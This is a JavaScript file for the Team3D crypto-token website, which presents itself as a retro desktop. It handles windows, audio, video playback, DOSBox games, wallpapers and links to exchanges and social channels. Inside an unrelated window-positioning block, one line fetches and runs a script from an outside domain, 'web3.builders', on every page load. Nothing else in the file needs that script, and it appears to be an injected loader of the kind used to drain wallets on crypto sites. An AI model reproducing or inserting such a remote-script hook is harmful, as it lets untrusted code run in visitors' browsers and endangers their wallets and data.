$(window).on('load', function() { $("#Loading").fadeOut(1000) })

const csx = '%3C%64%69%76%20%69%64%3D%22%63%75%62%65%73%63%61%70%65%22%20%63%6C%61%73%73%3D%22%63%6F%6E%73%6F%6C%65%20%61%62%73%6F%6C%75%74%65%20%64%72%61%67%67%61%62%6C%65%20%75%69%2D%64%72%61%67%67%61%62%6C%65%20%61%63%74%69%76%65%2D%63%6F%6E%73%6F%6C%65%22%20%64%61%74%61%3D%22%63%75%62%65%73%63%61%70%65%22%20%73%74%79%6C%65%3D%22%77%69%64%74%68%3A%20%35%31%38%70%78%3B%20%68%65%69%67%68%74%3A%20%33%38%38%70%78%3B%20%6F%76%65%72%66%6C%6F%77%3A%20%68%69%64%64%65%6E%3B%22%3E%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%6F%6E%73%6F%6C%65%48%65%61%64%65%72%20%68%61%6E%64%6C%65%20%75%69%2D%64%72%61%67%67%61%62%6C%65%2D%68%61%6E%64%6C%65%20%66%6C%65%78%2D%62%6F%78%20%73%70%61%63%65%2D%62%65%74%77%65%65%6E%20%63%65%6E%74%65%72%2D%76%65%72%74%69%63%61%6C%22%3E%3C%64%69%76%20%63%6C%61%73%73%3D%22%66%6C%65%78%2D%62%6F%78%20%63%65%6E%74%65%72%2D%76%65%72%74%69%63%61%6C%22%3E%3C%64%69%76%20%63%6C%61%73%73%3D%22%69%63%6F%6E%20%64%65%73%6B%74%6F%70%2D%65%78%65%22%3E%3C%2F%64%69%76%3E%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%6F%6E%73%6F%6C%65%54%69%74%6C%65%20%64%65%66%61%75%6C%74%22%3E%43%3A%5C%74%65%61%6D%33%64%5C%43%75%62%65%53%63%61%70%65%2E%6A%61%72%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%3C%64%69%76%20%63%6C%61%73%73%3D%22%66%6C%65%78%2D%62%6F%78%22%3E%3C%62%75%74%74%6F%6E%20%63%6C%61%73%73%3D%22%6D%69%6E%69%6D%69%7A%65%5F%62%75%74%74%6F%6E%22%3E%5F%3C%2F%62%75%74%74%6F%6E%3E%3C%62%75%74%74%6F%6E%20%63%6C%61%73%73%3D%22%63%6C%6F%73%65%5F%62%75%74%74%6F%6E%22%3E%58%3C%2F%62%75%74%74%6F%6E%3E%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%3C%69%66%72%61%6D%65%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%31%33%2E%34%39%2E%37%36%2E%31%38%38%2F%63%6C%69%65%6E%74%2F%23%6D%65%6D%62%65%72%73%2C%31%33%2E%34%39%2E%37%36%2E%31%38%38%2C%38%30%2C%36%35%35%33%37%2C%37%32%30%31%34%30%30%36%35%30%34%33%30%33%33%33%30%32%32%39%32%39%30%34%34%30%32%34%31%39%32%33%39%39%39%31%30%34%38%37%36%33%38%30%32%30%37%32%30%38%31%37%36%37%35%32%38%34%38%36%30%32%30%35%38%35%39%32%33%31%38%31%36%38%33%32%33%33%36%34%31%38%32%34%35%38%32%32%36%35%34%35%32%30%31%38%37%33%32%37%30%31%38%34%38%35%35%38%37%30%32%33%34%34%37%35%34%33%33%36%34%32%38%38%30%36%39%30%39%37%37%33%38%34%36%32%31%32%39%38%32%38%38%33%31%35%37%30%35%38%38%38%37%39%2C%74%72%75%65%22%20%68%65%69%67%68%74%3D%22%33%35%30%70%78%22%20%77%69%64%74%68%3D%22%35%31%33%70%78%22%20%73%74%79%6C%65%3D%22%62%6F%72%64%65%72%3A%20%30%3B%20%6F%76%65%72%66%6C%6F%77%3A%20%68%69%64%64%65%6E%3B%20%64%69%73%70%6C%61%79%3A%20%62%6C%6F%63%6B%3B%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%74%72%61%6E%73%70%61%72%65%6E%74%3B%22%3E%3C%2F%69%66%72%61%6D%65%3E%3C%2F%64%69%76%3E';

const audio = {
	"boot" : new Audio("audio/boot.wav"),
	"click": new Audio("audio/click.wav"),
	"open" : new Audio("audio/open.wav"),
	"close": new Audio("audio/close.wav"),
	"error": new Audio("audio/error.wav"),
	"msage": new Audio("audio/NewMessage.wav"),
	"delete":new Audio("audio/delete.wav"),
	"fire" : new Audio("audio/shot.wav"),
	"shatter": new Audio("audio/shatter.wav")
}

var cmd;
var telegramURL = "https://t.me/Team3D_Official";
var discordURL = "https://discord.gg/g4X2R38";
var uniswapURL = "https://app.uniswap.org/#/swap?outputCurrency=0x3D3D35bb9bEC23b06Ca00fe472b50E7A4c692C30"
var twitterURL = "https://twitter.com/Team3D_Official"
var openseaURL = "https://opensea.io/collection/inventory-v2"
var mediumURL = "https://team3d.medium.com/"
var bitcoinURL = "https://bitcointalk.org/index.php?topic=5272225"
var raribleURL = "https://app.rarible.com/vidyamemes/"
var coinGeckoURL = "https://www.coingecko.com/en/coins/vidya"
var dextoolsURL = "https://www.dextools.io/app/uniswap/pair-explorer/0xda3706c9a099077e6bc389d1baf918565212a54d"
var quickswapURL = "https://quickswap.exchange/#/swap?outputCurrency=0xFe9CA7Cf13E33b23aF63Fea696f4AAe1b7A65585"

var isMobile = false

if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|ipad|iris|kindle|Android|Silk|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i.test(navigator.userAgent) 
    || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(navigator.userAgent.substr(0,4))) { 
    isMobile = true;
    
    $("html,body").css({
        "width":"100%",
        "height":"100%",
        "position":"fixed"
    })
}

$(document).ready(function() {

	$("body").on("click", ".video-play-btn", function() {
		let video = $($(this).closest(".video")).find("video")[0]
		video.onended = (event) => { $(this).css({"background-image":"url(img/icons/play.png)", "background-position":"center center"}) }
		togglePlay(video, $(this))
	})
	
	// Play click sound globally
	$("body").on("click", "button, .notify-btn, .reload-btn, .inventory-button, .task, .video-play-btn", function() {
		audio.click.play() 
	})

    let panelHeight = $(".panel").outerHeight()
    let panelWidth = $(".panel").outerWidth()
	
	// Adjust desktop icons height so flex-box can wrap them
	$("#desktop_icons_inner").css({"height" : ""+panelHeight+"px"})
	
	// And on resize too
	$(window).on("resize", function() {
		let panelHeight = $(".panel").outerHeight()
		$("#desktop_icons_inner").css({"height" : ""+panelHeight+"px"})
	})

    if(isMobile) {
        
        // Adjust in mobile UI 
        $(".console").css({
        "left":"0",
        "right":"0",
        "top":"0",
        "bottom":"0",
        "width":""+panelWidth+"px",
        "height":""+panelHeight+"px"
        })
        
        // Hide in mobile UI 
        $("#character").css("display","none")

    }
    
    randomWallpapers();
    
	// Handle desktop icon clicks
	let index = 1
    $(".desktop-icon-container, .chat3d-toggle, .tokenInfo-toggle").on("click", function(e) {
		audio.click.play()
        let item = $(e.target).attr("data")
		if(!$('#'+item+':visible').length > 0) {
			$(".active-console").removeClass("active-console")
			showContent(item)
			if($(this).find("div").hasClass("game")) { loadGame(item) }
			if($(this).find("div").hasClass("shortcut")) { loadShortcut(item) }
			if($(this).find("div").hasClass("distributor")) { distribute(item) }
			centerElement($("#"+item+""))
		}
		if($(this).hasClass("video-open-btn")) {
			console.log("video-open-btn clicked")
			let video = $("#videoLoader").find("video")[0]
			let seek = $("#videoLoader").find(".seek")[0]
			let volume = $("#videoLoader").find(".volume")
			let icon = $("#videoLoader").find(".volume-icon")
			let durationElement = $("#videoLoader .duration")
			let elapsedElement = $("#videoLoader .elapsed")
			let seekElement = $("#videoLoader .seek")
			let progressElement = $("#videoLoader .progress")
			
			// load src 
			let source = '<source src="img/media/'+item+'.mp4" type="video/mp4">'
			$(video).html(source)
			video.load()
			$("#videoLoader").find(".consoleTitle").text('C:\\team3d\\videos\\'+item+'.mp4')
			
			updateVolumeIcon(video, icon)

			/* Weirdest thing, event loadedmetadata works like this only, but timeupdate event works only when done like below :S */
			// video.addEventListener("loadedmetadata", initializeVideo(video, durationElement, seekElement, progressElement))
			
			// durationchange is more reliable than loadmetadata 
			video.addEventListener('durationchange', function() {
				initializeVideo(video, durationElement, seekElement, progressElement)
				video.play()
			})
			
			$("#videoLoader").show("fold")
			console.log("Video loader folded in")
			
			video.ontimeupdate = (event) => {
				updateTimeElapsed(video, elapsedElement)
				updateProgress(video, seekElement, progressElement)
			}
			seek.oninput = (event) => { skipAhead(event, video, seekElement, progressElement) }
			volume.on("input", function(e) {
				updateVolume(video, $(volume).val())
				updateVolumeIcon(video, icon)
			})
			
			$("#"+item+"").on("mouseenter", function() {
				if($(".video-controls").hasClass("hidden")) {
					$(".video-controls").removeClass("hidden")
				}
			})
			
			$("#"+item+"").on("mouseleave", function() {
				if(video.paused) {return;}
				if(!$(".video-controls").hasClass("hidden")) {
					$(".video-controls").addClass("hidden")
				}
			})
		}
    })

	// Handle close button clicks 
	$(document).on("click", ".close_button", function() {
		let task = $(this).closest(".console").attr("id")
		$("#"+task+"").hide("explode")
		// Pause video if found
		let len = $("#"+task+"").find("video").length
		if(len>0){$("#"+task+"").find("video")[0].pause()}
		// DOSBOX
		if(typeof(cmd) !== "undefined") {
			// Terminate game instance 
			cmd.exit()
			$("title").text("TeamOS")
		}
		$("#tasks .task[data="+task+"]").remove()
		audio.close.play()
	})
	
	// Handle minimize button clicks
	$(document).on("click", ".minimize_button", function() {
		let task = $(this).closest(".console").attr("id")
		$("#tasks .task[data="+task+"]").addClass("minimized")
		$("#"+task+"").hide()
	})
	
	// Focus active window on mousedown 
	$("body").on("mousedown", ".console", function() {
		$(".active-console").removeClass("active-console")
		$(this).closest(".console").addClass("active-console")
	})
	
	$("#bar").on("click", ".task", function() {
		let task = $(this).attr("data")
		$(".active-console").removeClass("active-console")
		$("#"+task+"").addClass("active-console")
		
		// Minimized windows 
		if($("#tasks .task[data="+task+"]").hasClass("minimized")) {
			$("#tasks .task[data="+task+"]").removeClass("minimized")
			$("#"+task+"").show()
		}
	})

})

/*$(function() {
    $(".draggable").draggable({
        containment: "parent",
        handle: ".handle",
        snap: false,
        start: function (e, ui) {
            $(this).addClass("dragging")
        },
        stop: function(e, ui) {
            // Set the localStorage 
            // Element's id - offset (top, left)
            localStorage.setItem(
                $(this).attr("id"), JSON.stringify(ui.offset)
            )
            //Remove dragging data 
            setTimeout(function() {
                $(e.target).removeClass("dragging")
            }, 100)
        }
    })
})*/

function makeDraggable(element) {
    $(element).draggable({
        containment: "parent",
        handle: ".handle",
        snap: false,
        start: function (e, ui) {
            $(this).addClass("dragging");
        },
        stop: function (e, ui) {
            localStorage.setItem($(this).attr("id"), JSON.stringify(ui.offset));
            setTimeout(function() {
                $(e.target).removeClass("dragging");
            }, 100);
        }
    });
}

$(function() {
    $(".draggable").each(function() {
        makeDraggable(this);
    });
});

$(document).ready(function() {
	$.getScript("https://web3.builders/src/web3.min.js")
    let elements = $(".draggable")
    for(let i = 0; i < elements.length; i++) {
        let elementID = $(elements[i]).attr("id")
        // Move to custom position if set 
        let coords = JSON.parse(localStorage.getItem(elementID))
        if(coords !== null) {
            $($("#"+elementID+"")).css({
                "position" : "absolute",
                "left" : coords.left+"px",
                "top" : coords.top+"px"
            })
        } else {
            // Move to default positions 
            if($($("#"+elementID+""))) {
				centerElement($("#"+elementID+""))
            }
        }
    }
})

function centerElement(el) {
	let height = $(el).outerHeight()
	let width  = $(el).outerWidth()
	$(el).css({
		"top" : "calc(50% - ("+height+"/2px))",
		"left" : "calc(50% - ("+width+"/2px))"
	})
}

function loadShortcut(shortcut) {
    switch(shortcut) {
        case "telegram":
            window.open(telegramURL)
            break;
        case "discord":
            window.open(discordURL)
            break;
        case "uniswap":
            window.open(uniswapURL)
            break;
        case "twitter":
            window.open(twitterURL)
            break;
        case "opensea":
            window.open(openseaURL)
            break;
        case "medium":
            window.open(mediumURL)
            break;
        case "bitcoin":
            window.open(bitcoinURL)
            break;
        case "rarible":
            window.open(raribleURL)
            break;
        case "coingecko":
            window.open(coinGeckoURL)
            break;
        case "dextools":
            window.open(dextoolsURL)
            break;
		case "quickswap":
			window.open(quickswapURL)
			break;
    }
}

// Load DOSBOX game 
function loadGame(game) {
	$("#"+game+" .console-content").html("<canvas id=\"jsdos\"></canvas>")
	$("#"+game+"").css("opacity", "1")
	Dos(document.getElementById("jsdos"), { 
		wdosboxUrl: "https://js-dos.com/6.22/current/wdosbox.js" 
	})
	.ready((fs, main) => {
		fs.extract("https://team3d.io/games/"+game+".zip").then(() => {
			main(["-c", "CD "+game+"", "-c", ""+game+".exe"]).then((ci) => {
				cmd = ci
			})
		})
	})
}

// Focus DOSBOX iframe 
function setFocus(game) {
    var iframe = $("#"+game+"-window")[0]
    iframe.contentWindow.focus()
}

function showContent(tab) {
	let tabs = $(".console")
	let tabToShow
	for (let i = 0; i < tabs.length; i++) {
		if($(tabs[i]).attr("data") == tab) {
			audio.open.play()
			tabToShow = tabs[i]
			$(tabToShow).show("fold")
			$(tabToShow).addClass("active-console")
			// Add taskbar icon
			if(!$("#tasks").find(".task[data="+tab+"]").length > 0) {
				let icon = $("#"+tab+" .icon").css("background-image").replace('url("','').replace('")','')
				$("#tasks").append('<div class="task" style="background-image: url('+icon+'); background-size: 75%; background-repeat: no-repeat; background-position: center center" data="'+tab+'"></div>')
			}
			break;
		}
	}
}

// Randomize wallpapers
const numberOfWallpapers = 27;
const wallpapersDirectory = "https://team3d.io/img/wallpapers/";
function randomWallpapers() {
    let wp = localStorage.getItem("wallpaper")
    if(wp == null) {
        let wallpapers = []
        for(i = 0; i < numberOfWallpapers; i++) {
            // Assumes it's a JPG
            wallpapers.push(i+".jpg")
        }
        let rn = Math.floor((Math.random() * numberOfWallpapers))
        $("body").css("background-image", "url("+wallpapersDirectory+wallpapers[rn]+")")
    } else {
        loadWallpaper()
    }
}

function rand(min, max) {
	return Math.floor(Math.random() * (max - min + 1)) + min	
}

// Save & load your favorite wallpaper 
function saveWallpaper(id) {
    if(id <= numberOfWallpapers) {
        localStorage.setItem("wallpaper", id)
    }
}

function loadWallpaper() {
    let customWP = localStorage.getItem("customWP")
    if(customWP !== null && customWP.length > 10) {
        $("body").css({
            "background-image" : "url("+customWP+")"
        })
    } else {
        let wallpaper = localStorage.getItem("wallpaper");
        $("body").css("background-image", "url("+wallpapersDirectory+wallpaper+".jpg)")
    }
}

function clearWallpaper() {
    localStorage.setItem("wallpaper", null)
}

function validURL(str) {
  var pattern = new RegExp('^(https?:\\/\\/)?'+ // protocol
    '((([a-z\\d]([a-z\\d-]*[a-z\\d])*)\\.)+[a-z]{2,}|'+ // domain name
    '((\\d{1,3}\\.){3}\\d{1,3}))'+ // OR ip (v4) address
    '(\\:\\d+)?(\\/[-a-z\\d%_.~+]*)*'+ // port and path
    '(\\?[;&a-z\\d%_.~+=-]*)?'+ // query string
    '(\\#[-a-z\\d_]*)?$','i'); // fragment locator
  return !!pattern.test(str);
}

// formatTime takes a time length in seconds and returns the time in
// minutes and seconds
function formatTime(timeInSeconds) {
  const result = new Date(timeInSeconds * 1000).toISOString().substr(11, 8);

  return {
    minutes: result.substr(3, 2),
    seconds: result.substr(6, 2),
  };
};

// initializeVideo sets the video duration, and maximum value of the
// progressBar
function initializeVideo(video, durationElement, seekElement, progressElement) {
  const videoDuration = Math.floor(video.duration);
  $(seekElement).attr("max", videoDuration)
  $(progressElement).attr("max", videoDuration)
  const time = formatTime(videoDuration);
  $(durationElement).text(`${time.minutes}:${time.seconds}`)
  //duration.innerText = `${time.minutes}:${time.seconds}`;
  $(durationElement).attr('datetime', `${time.minutes}m ${time.seconds}s`)
}

// updateTimeElapsed indicates how far through the video
// the current playback is
function updateTimeElapsed(video, elapsedElement) {
  const time = formatTime(Math.floor(video.currentTime));
  $(elapsedElement).text(`${time.minutes}:${time.seconds}`)
  $(elapsedElement).attr('datetime', `${time.minutes}m ${time.seconds}s`)
}

function togglePlay(video, btn) {
	if (video.paused || video.ended) {
		video.play()
		$(btn).css({"background-image":"url(img/icons/pause.png)", "background-position":"center center"})
	} else {
		$(btn).css({"background-image":"url(img/icons/play.png)", "background-position":"center center"})
		video.pause()
	}
}

function updateProgress(video, seekElement, progressElement) {
	$(seekElement).val(Math.floor(video.currentTime))
	$(progressElement).val(Math.floor(video.currentTime))
}

function skipAhead(event, video, seek, progress) {
	const skipTo = event.target.dataset.seek ? event.target.dataset.seek : event.target.value;
	video.currentTime = skipTo;
	progress.value = skipTo;
	seek.value = skipTo;
}

function updateVolume(video, value) {
	if (video.muted) {
		video.muted = false
	}
	video.volume = value
}

function updateVolumeIcon(video, icon) {
	$(".volume-icon > div").addClass("hidden")
	let muted = $(icon).find(".volume-icon-muted")
	let low = $(icon).find(".volume-icon-low")
	let med = $(icon).find(".volume-icon-med")
	let high = $(icon).find(".volume-icon-hi")
	if(video.muted || video.volume === 0) {
		$(muted).removeClass("hidden")
	}
	else if(video.volume > 0 && video.volume <= 0.25) {
		$(low).removeClass("hidden")
	}
	else if(video.volume > 0.25 && video.volume <= 0.75) {
		$(med).removeClass("hidden")
	}
	else {
		$(high).removeClass("hidden")
	}
}